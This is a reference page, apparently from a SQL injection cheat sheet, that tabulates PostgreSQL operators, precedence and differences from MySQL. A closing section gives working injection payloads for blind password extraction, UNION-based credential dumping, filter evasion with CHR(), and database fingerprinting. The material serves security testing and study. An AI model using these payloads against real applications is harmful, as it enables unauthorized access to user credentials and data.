---
title: Operators
description: PostgreSQL operators useful for SQL injection techniques
category: Reference
order: 21
tags: ["operators", "comparison", "logical", "reference"]
lastUpdated: 2025-12-14
---

## Operators

Understanding PostgreSQL operators is essential for crafting effective SQL injection payloads. This reference covers the most useful operators for SQL injection techniques.

### Comparison Operators

| Operator               | Description                | Example                                                    |
| ---------------------- | -------------------------- | ---------------------------------------------------------- |
| `=`                    | Equal                      | `SELECT * FROM users WHERE id = 1`                         |
| `<>` or `!=`           | Not equal                  | `SELECT * FROM users WHERE id <> 1`                        |
| `>`                    | Greater than               | `SELECT * FROM users WHERE id > 1`                         |
| `>=`                   | Greater than or equal      | `SELECT * FROM users WHERE id >= 1`                        |
| `<`                    | Less than                  | `SELECT * FROM users WHERE id < 10`                        |
| `<=`                   | Less than or equal         | `SELECT * FROM users WHERE id <= 10`                       |
| `BETWEEN`              | Between range              | `SELECT * FROM users WHERE id BETWEEN 1 AND 10`            |
| `IS NULL`              | Null check                 | `SELECT * FROM users WHERE email IS NULL`                  |
| `IS NOT NULL`          | Not null check             | `SELECT * FROM users WHERE email IS NOT NULL`              |
| `IS DISTINCT FROM`     | NULL-safe not equal        | `SELECT * FROM users WHERE name IS DISTINCT FROM 'a'`      |
| `IS NOT DISTINCT FROM` | NULL-safe equal            | `SELECT * FROM users WHERE name IS NOT DISTINCT FROM NULL` |
| `LIKE`                 | Pattern matching           | `SELECT * FROM users WHERE name LIKE 'a%'`                 |
| `ILIKE`                | Case-insensitive LIKE      | `SELECT * FROM users WHERE name ILIKE 'ADMIN'`             |
| `SIMILAR TO`           | SQL regex pattern          | `SELECT * FROM users WHERE name SIMILAR TO 'a%'`           |
| `~`                    | POSIX regex match          | `SELECT * FROM users WHERE name ~ '^a'`                    |
| `~*`                   | Case-insensitive regex     | `SELECT * FROM users WHERE name ~* '^A'`                   |
| `!~`                   | Regex not match            | `SELECT * FROM users WHERE name !~ '^a'`                   |
| `!~*`                  | Case-insensitive not match | `SELECT * FROM users WHERE name !~* '^A'`                  |
| `IN`                   | In set                     | `SELECT * FROM users WHERE id IN (1,2,3)`                  |

### Logical Operators

| Operator | Description | Example                                                |
| -------- | ----------- | ------------------------------------------------------ |
| `AND`    | Logical AND | `SELECT * FROM users WHERE active=true AND admin=true` |
| `OR`     | Logical OR  | `SELECT * FROM users WHERE id=1 OR username='admin'`   |
| `NOT`    | Logical NOT | `SELECT * FROM users WHERE NOT id=1`                   |

**Important**: PostgreSQL uses `||` for string/array concatenation and `&&` for array overlap—not for logical operations (use `AND`/`OR` instead). This differs from some databases but both PostgreSQL and MySQL require explicit `AND`/`OR` keywords for logical operations.

### String Operators

| Operator      | Description                  | Example                                                  |
| ------------- | ---------------------------- | -------------------------------------------------------- |
| `\|\|`        | String concatenation         | `SELECT 'hello' \|\| ' ' \|\| 'world'`                   |
| `CONCAT()`    | Concatenate strings          | `SELECT CONCAT(first_name, ' ', last_name) FROM users`   |
| `CONCAT_WS()` | Concatenation with separator | `SELECT CONCAT_WS('-', 'a', 'b', 'c')` (returns 'a-b-c') |

### Mathematical Operators

| Operator | Description    | Example                      |
| -------- | -------------- | ---------------------------- |
| `+`      | Addition       | `SELECT id+1 FROM users`     |
| `-`      | Subtraction    | `SELECT id-1 FROM users`     |
| `*`      | Multiplication | `SELECT id*2 FROM users`     |
| `/`      | Division       | `SELECT id/2 FROM users`     |
| `%`      | Modulo         | `SELECT id % 2 FROM users`   |
| `^`      | Exponentiation | `SELECT 2^3` (returns 8)     |
| `\|/`    | Square root    | `SELECT \|/25` (returns 5)   |
| `\|\|/`  | Cube root      | `SELECT \|\|/27` (returns 3) |
| `@`      | Absolute value | `SELECT @ -5` (returns 5)    |

### Bitwise Operators

| Operator | Description | Example                     |
| -------- | ----------- | --------------------------- |
| `&`      | Bitwise AND | `SELECT 5 & 1` (returns 1)  |
| `\|`     | Bitwise OR  | `SELECT 5 \| 1` (returns 5) |
| `#`      | Bitwise XOR | `SELECT 5 # 1` (returns 4)  |
| `<<`     | Left shift  | `SELECT 1 << 2` (returns 4) |
| `>>`     | Right shift | `SELECT 4 >> 2` (returns 1) |
| `~`      | Bitwise NOT | `SELECT ~1` (returns -2)    |

### Type Cast Operator

PostgreSQL has a unique cast operator `::`:

```sql
SELECT '123'::int;          -- Cast string to integer
SELECT 123::text;           -- Cast integer to text
SELECT '2025-01-01'::date;  -- Cast string to date
SELECT 1::boolean;          -- Cast to boolean (true)
```

### Array Operators

| Operator | Description         | Example                         |
| -------- | ------------------- | ------------------------------- |
| `@>`     | Contains            | `ARRAY[1,2,3] @> ARRAY[1,2]`    |
| `<@`     | Is contained by     | `ARRAY[1,2] <@ ARRAY[1,2,3]`    |
| `&&`     | Overlap (arrays)    | `ARRAY[1,2] && ARRAY[2,3]`      |
| `\|\|`   | Array concatenation | `ARRAY[1,2] \|\| ARRAY[3,4]`    |
| `[n]`    | Array subscript     | `(ARRAY[1,2,3])[1]` (returns 1) |

**Note:** PostgreSQL arrays are 1-based, so `[1]` returns the first element, not the second.

### JSON/JSONB Operators

| Operator | Description              | Example                                |
| -------- | ------------------------ | -------------------------------------- |
| `->`     | Get JSON element         | `'{"a":1}'::json->'a'` (returns 1)     |
| `->>`    | Get JSON element as text | `'{"a":1}'::json->>'a'` (returns '1')  |
| `#>`     | Get by path              | `'{"a":{"b":1}}'::json#>'{a,b}'`       |
| `#>>`    | Get by path as text      | `'{"a":{"b":1}}'::json#>>'{a,b}'`      |
| `@>`     | Contains (JSONB)         | `'{"a":1}'::jsonb @> '{"a":1}'::jsonb` |
| `?`      | Key exists               | `'{"a":1}'::jsonb ? 'a'`               |

### Usage in SQL Injection

#### Boolean-Based Blind Injection

```sql
-- Testing if admin exists
' OR EXISTS(SELECT * FROM users WHERE username='admin') --

-- Character by character extraction
' OR ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97 --
```

#### Using String Concatenation

```sql
-- PostgreSQL uses || for concatenation (NOT logical OR)
' UNION SELECT 'admin'||':'||password FROM users --

-- Building strings to avoid filters
' UNION SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110) --
```

#### Regex-Based Injection

```sql
-- Using POSIX regex for blind extraction
' OR (SELECT username FROM users LIMIT 1) ~ '^a' --

-- Case insensitive regex
' OR (SELECT username FROM users LIMIT 1) ~* '^ADMIN' --
```

#### Type Cast for Database Detection

```sql
-- PostgreSQL-specific :: cast syntax
' AND 1::int=1 --

-- Will fail on MySQL/MSSQL, confirming PostgreSQL
```

### Operator Precedence in PostgreSQL

From highest to lowest (per [PostgreSQL documentation](https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-PRECEDENCE)):

1. `.` (table/column name separator)
2. `::` (typecast)
3. `[]` (array element selection)
4. `+`, `-` (unary plus, unary minus)
5. `COLLATE` (collation selection)
6. `AT` (AT TIME ZONE, AT LOCAL)
7. `^` (exponentiation)
8. `*`, `/`, `%` (multiplication, division, modulo)
9. `+`, `-` (addition, subtraction)
10. (any other operator) — includes `||`, user-defined operators
11. `BETWEEN`, `IN`, `LIKE`, `ILIKE`, `SIMILAR`
12. `<`, `>`, `=`, `<=`, `>=`, `<>`
13. `IS`, `ISNULL`, `NOTNULL` (IS TRUE, IS FALSE, IS NULL, IS DISTINCT FROM, etc.)
14. `NOT`
15. `AND`
16. `OR`

### Truth Table for Logical Operators

| Expr1 | Expr2 | AND   | OR    |
| ----- | ----- | ----- | ----- |
| TRUE  | TRUE  | TRUE  | TRUE  |
| TRUE  | FALSE | FALSE | TRUE  |
| FALSE | TRUE  | FALSE | TRUE  |
| FALSE | FALSE | FALSE | FALSE |
| NULL  | TRUE  | NULL  | TRUE  |
| TRUE  | NULL  | NULL  | TRUE  |
| FALSE | NULL  | FALSE | NULL  |
| NULL  | FALSE | FALSE | NULL  |
| NULL  | NULL  | NULL  | NULL  |

### Key Differences from MySQL

1. `||` is string concatenation, NOT logical OR
2. `#` is bitwise XOR (MySQL uses `^`)
3. `^` is exponentiation (MySQL uses `POW()`)
4. `~` and `~*` are regex operators
5. `::` is the cast operator (unique to PostgreSQL)
6. No `<=>` NULL-safe equal (use `IS NOT DISTINCT FROM`)
7. No logical `XOR` keyword (bitwise XOR is `#`; for logical XOR use `A != B` or `(A OR B) AND NOT (A AND B)`)
